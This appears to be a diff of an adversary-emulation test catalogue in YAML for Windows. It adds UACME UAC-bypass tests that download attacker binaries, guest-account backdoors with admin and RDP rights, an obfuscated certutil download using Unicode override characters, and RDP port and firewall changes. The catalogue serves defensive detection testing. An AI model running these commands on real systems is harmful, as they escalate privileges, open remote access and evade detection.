+      auto_generated_guid: dfb1b667-4bb8-4a63-a85e-29936ea75f29
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and
+        DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM
+        Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\59 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
+    - name: UACME Bypass Method 61
+      auto_generated_guid: 7825b576-744c-4555-856d-caf3460dc236
+      description: "Executes User Account Control Bypass according to the methods
+        listed below. Upon successful execution you should see event viewer load and
+        two administrative command prompts.\nNote: The cleanup_command's which kill
+        the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor:
+        Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod:
+        Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker
+        defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        uacme_exe:
+          description: Path to uacme executable
+          type: Path
+          default: "%temp%\\uacme\\61 Akagi64.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'UACME executable must exist on disk at specified location (#{uacme_exe})
+
+'
+        prereq_command: |
+          $tempPath = cmd /c echo #{uacme_exe}
+          if (Test-Path "$tempPath") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest "https://github.com/justaseckev/atomic-red-team/raw/master/atomics/T1548.002/src/UACMe%20binaries.zip" -OutFile "$env:TEMP\uacme.zip"
+          Expand-Archive $env:TEMP\uacme.zip $env:TEMP\uacme -Force
+          Remove-Item $env:TEMP\uacme.zip -Force
+      executor:
+        command: '"#{uacme_exe}"
+
+'
+        cleanup_command: |
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
+        name: command_prompt
   T1218.003:
     technique:
       external_references:
@@ -22787,6 +23490,14 @@ defense-evasion:
           description: Specify the guest password
           type: String
           default: Password123!
+        local_admin_group:
+          description: Specify the admin localgroup name
+          type: String
+          default: Administrators
+        remote_desktop_users_group_name:
+          description: Specify the remote desktop users group name
+          type: String
+          default: Remote Desktop Users
         remove_rdp_access_during_cleanup:
           description: Set to 1 if you want the cleanup to remove RDP access to machine
           type: Integer
@@ -22795,14 +23506,14 @@ defense-evasion:
         command: |-
           net user #{guest_user} /active:yes
           net user #{guest_user} #{guest_password}
-          net localgroup administrators #{guest_user} /add
-          net localgroup "Remote Desktop Users" #{guest_user} /add
+          net localgroup #{local_admin_group} #{guest_user} /add
+          net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
           net user #{guest_user} /active:no >nul 2>&1
-          net localgroup administrators #{guest_user} /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
+          net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1
+          net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /delete >nul 2>&1
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
@@ -22816,11 +23527,16 @@ defense-evasion:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
       executor:
-        command: 'net user guest /active:yes
+        command: 'net user #{guest_user} /active:yes
 
 '
-        cleanup_command: 'net user guest /active:no
+        cleanup_command: 'net user #{guest_user} /active:no
 
 '
         name: command_prompt
@@ -31073,6 +31789,32 @@ defense-evasion:
 
 '
         name: powershell
+    - name: Obfuscated Command Line using special Unicode characters
+      auto_generated_guid: e68b945c-52d0-4dd9-a5e8-d173d70c448f
+      description: |
+        This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. ᶠ) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters).
+        Reference:
+        https://wietze.github.io/blog/windows-command-line-obfuscation
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_file:
+          description: URL of file to copy
+          type: Url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+        local_path:
+          description: Local path to place file
+          type: Path
+          default: Atomic-license.txt
+      executor:
+        command: 'cmd /c certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −"൏ᶠ൸" #{remote_file}
+          #{local_path}
+
+'
+        cleanup_command: 'del #{local_path} >nul 2>&1
+
+'
+        name: command_prompt
   T1218.008:
     technique:
       id: attack-pattern--6e3bd510-6b33-41a4-af80-2d80f3ee0071
@@ -38148,12 +38890,10 @@ defense-evasion:
     atomic_tests:
     - name: MSXSL Bypass using local files
       auto_generated_guid: ca23bfb2-023f-49c5-8802-e66997de462d
-      description: 'Executes the code specified within a XSL script tag during XSL
-        transformation using a local payload. Requires download of MSXSL from Microsoft
-        at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe
-        when test sucessfully executed, while AV turned off.
-
-'
+      description: "Executes the code specified within a XSL script tag during XSL
+        transformation using a local payload. \nRequires download of MSXSL from Microsoft
+        (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714
+        ). \nOpen Calculator.exe when test sucessfully executed, while AV turned off.\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -38185,6 +38925,16 @@ defense-evasion:
         get_prereq_command: |
           New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
+      - description: 'msxsl.exe must exist on disk at specified location (#{msxsl_exe})
+
+'
+        prereq_command: 'if (Test-Path #{msxsl_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://web.archive.org/web/20200803205229/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "$env:TEMP\msxsl.exe"
+          Copy-Item $env:TEMP\msxsl.exe #{msxsl_exe} -Force
+          Remove-Item $env:TEMP\msxsl.exe
       executor:
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
 
@@ -41573,6 +42323,14 @@ persistence:
           description: Specify the guest password
           type: String
           default: Password123!
+        local_admin_group:
+          description: Specify the admin localgroup name
+          type: String
+          default: Administrators
+        remote_desktop_users_group_name:
+          description: Specify the remote desktop users group name
+          type: String
+          default: Remote Desktop Users
         remove_rdp_access_during_cleanup:
           description: Set to 1 if you want the cleanup to remove RDP access to machine
           type: Integer
@@ -41581,14 +42339,14 @@ persistence:
         command: |-
           net user #{guest_user} /active:yes
           net user #{guest_user} #{guest_password}
-          net localgroup administrators #{guest_user} /add
-          net localgroup "Remote Desktop Users" #{guest_user} /add
+          net localgroup #{local_admin_group} #{guest_user} /add
+          net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
           net user #{guest_user} /active:no >nul 2>&1
-          net localgroup administrators #{guest_user} /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
+          net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1
+          net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /delete >nul 2>&1
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
@@ -41602,11 +42360,16 @@ persistence:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
       executor:
-        command: 'net user guest /active:yes
+        command: 'net user #{guest_user} /active:yes
 
 '
-        cleanup_command: 'net user guest /active:no
+        cleanup_command: 'net user #{guest_user} /active:no
 
 '
         name: command_prompt
@@ -62840,9 +63603,9 @@ execution:
     - name: Execute a Command as a Service
       auto_generated_guid: 2382dee2-a75f-49aa-9378-f52df6ed3fb1
       description: |
-        Creates a service specifying an aribrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.
+        Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.
 
-        Upon successful execution, cmd.exe create a new service using sc.exe create that will start powershell.exe to create a new file `art-marker.txt`
+        Upon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`
       supported_platforms:
       - windows
       input_arguments:
@@ -64912,6 +65675,56 @@ lateral-movement:
           $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
           if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
         name: powershell
+    - name: Changing RDP Port to Non Standard Port via Powershell
+      auto_generated_guid: 2f840dd4-8a2e-4f44-beb3-6b2399ea3771
+      description: 'Changing RDP Port to Non Standard Port via Remote Desktop Application
+        over Powershell
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        OLD_Remote_Port:
+          description: Default RDP Listening Port
+          type: String
+          default: '3389'
+        NEW_Remote_Port:
+          description: New RDP Listening Port
+          type: String
+          default: '4489'
+      executor:
+        command: |
+          Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port}
+          New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
+        cleanup_command: "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal
+          Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{OLD_Remote_Port}\nRemove-NetFirewallRule
+          -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction ignore \n"
+        name: powershell
+    - name: Changing RDP Port to Non Standard Port via Command_Prompt
+      auto_generated_guid: 74ace21e-a31c-4f7d-b540-53e4eb6d1f73
+      description: 'Changing RDP Port to Non Standard Port via Command_Prompt
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        OLD_Remote_Port:
+          description: Default RDP Listening Port
+          type: String
+          default: '3389'
+        NEW_Remote_Port:
+          description: New RDP Listening Port
+          type: String
+          default: '4489'
+      executor:
+        command: |
+          reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} -f
+          netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
+        cleanup_command: |
+          reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} -f >nul 2>&1
+          netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
+        name: command_prompt
+        elevation_required: true
   T1563:
     technique:
       external_references:
@@ -70431,6 +71244,14 @@ initial-access:
           description: Specify the guest password
           type: String
           default: Password123!
+        local_admin_group:
+          description: Specify the admin localgroup name
+          type: String
+          default: Administrators
+        remote_desktop_users_group_name:
+          description: Specify the remote desktop users group name
+          type: String
+          default: Remote Desktop Users
         remove_rdp_access_during_cleanup:
           description: Set to 1 if you want the cleanup to remove RDP access to machine
           type: Integer
@@ -70439,14 +71260,14 @@ initial-access:
         command: |-
           net user #{guest_user} /active:yes
           net user #{guest_user} #{guest_password}
-          net localgroup administrators #{guest_user} /add
-          net localgroup "Remote Desktop Users" #{guest_user} /add
+          net localgroup #{local_admin_group} #{guest_user} /add
+          net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
           net user #{guest_user} /active:no >nul 2>&1
-          net localgroup administrators #{guest_user} /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
+          net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1
+          net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /delete >nul 2>&1
           if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
           if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
@@ -70460,11 +71281,16 @@ initial-access:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
       executor:
-        command: 'net user guest /active:yes
+        command: 'net user #{guest_user} /active:yes
 
 '
-        cleanup_command: 'net user guest /active:no
+        cleanup_command: 'net user #{guest_user} /active:no
 
 '
         name: command_prompt
